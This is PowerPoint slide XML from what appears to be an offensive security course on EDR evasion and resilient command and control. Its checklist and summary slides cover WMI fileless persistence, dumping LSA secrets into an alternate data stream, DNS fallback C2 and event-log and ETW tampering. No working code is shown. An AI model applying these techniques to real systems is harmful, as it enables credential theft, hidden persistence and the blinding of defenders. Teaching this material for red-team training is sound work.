        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Verification Checklist</a:t>
            </a:r>
            <a:endPar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WMI Filter and Consumer created successfully</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Filter and Consumer bound together</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Base64 payload stored in WMI query</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LSA secrets dumped</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Hashes stored in ADS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hosts:secret</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ADS verified with Get-Item -Stream *</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System rebooted</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Session re-established without manual intervention</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Primary listener killed</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Fallback (DNS) session established</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="28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Summary</a:t>
            </a:r>
            <a:endPar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Part 1: DNS/ICMP fallback activates after 5 retries</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Part 2: WMI permanent subscription (fileless, base64-encoded)</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Part 3: LSA secrets stored in ADS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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hosts:secret</a:t>
            </a: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Part 4: Reboot test confirms automatic reconnection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="172596582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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                                                                   Thank you</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="389342535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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="131087715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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="113763569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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13705775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676</TotalTime>
  <Words>11097</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>799</Paragraphs>
  <Slides>60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60</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="69" baseType="lpstr">
      <vt:lpstr>Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>KaTeX_Main</vt:lpstr>
      <vt:lpstr>KaTeX_Math</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>quote-cjk-patch</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>WEEK 11</vt:lpstr>
      <vt:lpstr>Week 11: Advanced EDR Evasion, Telemetry Killing &amp; Resilient C2 </vt:lpstr>
      <vt:lpstr>Task 01: Deep OPSEC–Selective Event Log Tampering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Task 02: ETW Patching – Blind the EDR Kernel Sensors (Beyond AMSI)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Task 03: Direct Syscall Execution – Bypassing EDR User-Mode Hooks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Task 04: Fortress Persistence – The "Phoenix" Implant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11</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>15</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-27T07:05:07Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-30T04:45:33Z</dcterms:modified>
</cp:coreProperties>
</file>